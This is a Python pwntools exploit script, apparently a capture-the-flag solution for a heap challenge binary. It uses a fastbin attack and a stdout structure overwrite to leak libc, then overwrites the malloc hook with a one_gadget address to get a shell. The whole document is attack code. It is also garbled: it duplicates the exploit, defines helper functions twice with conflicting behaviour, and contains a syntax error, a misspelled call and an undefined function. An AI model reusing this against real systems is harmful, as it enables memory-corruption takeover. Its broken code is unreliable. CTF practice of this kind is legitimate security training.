from pwn import *
context.log_level = 'debug'
def create(idx,size,name):
	p.sendline("1")
	p.recv()
	p.sendline(str(size))
	p.recv()
	p.sendline(str(idx))
	p.recv()
	p.send(name)
	p.recv()

def delete(idx):
	p.sendline("2")
	p.recv()
	p.sendline(str(idx))
	p.recv()

def rename(idx,data):
	p.sendline("3")
	p.recv()
	p.sendline(str(idx))
	p.recv()
	p.send(data)
	p.recv()




def create(index,size,name):
	p.sendlineafter("choice >> \n","1")
	p.sendlineafter("weapon: ",str(size))
	p.sendlineafter("index: ",str(index))
	p.sendlineafter("name: ",str(index))

def delete(index):
	p.sendlineafter(">> \n","2")
	p.sendlineafter("input idx :",str(index))

def edit(index,name):
	p.sendlineafter(">> ","3")
	p.sendlineafter("idx: ",str(index))
	p.sendafter("new content:\b",name)

p = process('./pwn')
create(0,0x28,"\x00"*0x10+p64(0x30))
create(1,0x28,"a")
create(2,0x50,"a")
create(3,0x60,"aa")
delete(0)
delete(1) rename(1,"\x18")
create(0,0x28,"c")
create(1,0x28,p64(0)*2+p64(0x91))
delete(0)
create(4,0x60,"\xdd\x25")
create(5,0x60,"aaaa")
delete(3)
delete(5)
rename(5,"\x30")
create(6,0x60,"a")
create(6,0x60,"v")
create(6,0x60,"a")
rename(6,"\x00"*3+p64(0)*6+p64(0xfbad1887)+p64(0)*3+"\x00")
p.recvuntil("\x7f")
p.recv(2)
libc_addr = u64(p.recv(8))-0x7ffff7dd26a3+0x7ffff7a0d000
print hex(libc_addr)
create(6,0x60,"ee")
delete(6)
rename(6,p64(libc_addr+0x7ffff7dd1b10-0x7ffff7a0d000-0x23))
create(6,0x60,"aa")
create(6,0x60,"\x00"*0x13+p64(libc_addr+0xf1147))
p.interactive()


#start
p = process('./pwn')

create(0,0x28,"a")
#0x30
create(1,0x28,"a")
#0x60
create(2,0x50,"c")
#0xc0
create(3,0x60,"aa")

pad =p64(0x0)*2+p64(0x30)
rename(0,pad)

delete(0)
delete(1)
rename(1,"\x18")
#0x30
create(0,0x28,"0")
pad2 = p64(0x0)*2 +p64(0x91)
#0x00
create(1,0x28,pad2)
delete(0)
#why this address
#0x30
create(4,0x60,"\xdd\x25")
#0x130
create(5,0x60,"aaaa")
delete(3)
delete(5)
rename(5,"\x30")
# fastbin attack 控制到 \xdd\x25地址处
create(6,0x60,"a")
create(6,0x60,"b")
create(6,0x60,"c")
#IO_STDOUT
pad="\x00"*3+p64(0)*6+p64(0xfbad1887)+p64(0)*3+"\x00"
rename(6,pad)
p.recvtunil("\x7f")
p.recv(2)
libc_addr = u64(p.recv(8))-0x7ffff7dd26a3+0x7ffff7a0d000
add(6,0x60,"eee")
delete(6)
rename(6,p64(libc_addr + 0x7ffff7dd1b10-0x7ffff7a0d000-0x23))
add(6,0x60,"aaa")
add(6,0x60,"\x00"*0x13+p64(libc_addr+0xf1147))
p.interactive()


